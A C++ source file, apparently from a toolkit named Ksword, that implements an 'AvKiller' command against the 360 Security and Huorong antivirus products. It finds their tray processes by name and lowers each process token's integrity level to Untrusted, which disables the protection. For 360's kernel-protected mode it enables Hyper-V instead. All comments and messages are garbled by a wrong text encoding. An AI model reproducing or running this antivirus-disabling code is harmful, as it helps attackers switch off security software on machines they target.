#ifdef KSWORD_WITH_COMMAND
#include "../../KswordTotalHead.h"
#include <sddl.h>
using namespace std;
bool AvKillCore(DWORD pid) {

    // 3. ��Ŀ�����
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) {
        KMesErr("��Ŀ�����ʧ�ܣ��������" + to_string(GetLastError()));
        return 1;
    }

    // 4. ��ȡ��������
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_DEFAULT, &hToken)) {
        KMesErr("��Ŀ���������ʧ�ܣ��������" + to_string(GetLastError()));
        CloseHandle(hProcess);
        return 1;
    }

    // 5. ����Untrusted SID
    PSID untrustedSid = nullptr;
    if (!ConvertStringSidToSidA("S-1-16-0", &untrustedSid)) {
        KMesErr("��Ȩ�޽������ƴ���ʧ�ܣ��������" + to_string(GetLastError()));
        CloseHandle(hToken);
        CloseHandle(hProcess);
        system("pause");
        return 1;
    }

    // 6. ׼��������Ϣ�ṹ
    TOKEN_MANDATORY_LABEL tml = { 0 };
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = untrustedSid;

    // 7. �������������Լ���
    if (!SetTokenInformation(hToken, TokenIntegrityLevel, &tml, sizeof(tml) + GetLengthSid(untrustedSid))) {
        KMesErr("��ȨĿ�����ʧ�ܣ��������" + to_string(GetLastError()));
        LocalFree(untrustedSid);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }
    KMesInfo("Ŀ����̳ɹ���Ȩ");

    // 8. ������Դ
    LocalFree(untrustedSid);
    CloseHandle(hToken);
    CloseHandle(hProcess);
}
int avkill() {
	KMesWarn("AvKiller�ڲ����v.1.0.0�ṩ����");
    KMesWarn("������2025/05/01");
    KMesWarn("CoffeeStudio��������");
    cout << "������Ŀ��ɱ����ţ�" << endl <<
        "1>360��ȫ��ʿ(�޺˾�)\t2>���ް�ȫ" << endl <<
        "3>360��ȫ��ʿ(�к˾�)" << endl<<
		">";
	string userinput = Kgetline();
	if (userinput == "1" || userinput == "360") {
		int pid = GetPIDByIM("360tray.exe");
		if (pid == 0) {
			KMesErr("δ��⵽360����ģ��360tray.exe");
		}
		else {
			KMesInfo("�ҵ��ؼ�����360tray.exe������pidΪ" + to_string(pid));
            AvKillCore(pid);
		}
	}
	else if(userinput=="2"||userinput=="hr"){
		int pid = GetPIDByIM("HipsTray.exe");
		if (pid == 0) {
			KMesErr("δ��⵽���޺���ģ��HipsTray.exe");
		}
		else {
			KMesInfo("�ҵ��ؼ�����HipsTray������pidΪ" + to_string(pid));
            AvKillCore(pid);
		}
	}
    else if (userinput == "3") {
        RunCmdNow("dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /all /norestart");
        RunCmdNow("bcdedit /set hypervisorlaunchtype auto");
        KMesWarn("��Ҫ��������ϵͳ�����ϣ��Ksword�������������Գ���ʹ��netmgr����360���������Ŀ¼");
    }
	else {
		KMesErr("Ŀ�귴���������δ�������嵥");
	}
	return 0;
}
#endif